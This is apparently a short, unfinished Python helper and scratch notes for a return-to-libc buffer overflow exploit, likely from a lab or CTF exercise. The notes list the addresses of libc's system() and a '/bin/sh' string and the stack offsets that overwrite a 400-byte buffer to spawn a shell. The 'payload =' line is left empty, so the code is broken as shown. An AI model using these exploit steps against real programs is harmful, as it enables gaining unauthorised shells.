from struct import pack as p

def printable(c):
    return c >= 0x20 and c <= 0x7e

payload = 
for c in payload:
    if printable(c):
        print("%c" % c, end="")
    else:
        print("\\x%02x" % c, end="")
4159090384 sys 4160264172 binsh 

0xf7e45513->4158936339 system 0xf7e45517->4158936343 binsh

4159090384 // system() addr in libc
2147483762 // esp addr - buffer[400] addr in an overflow (456)
4160264172 // /bin/sh string addr
2147483764 // esp+4 addr - buffer[400] addr in an overflow (464)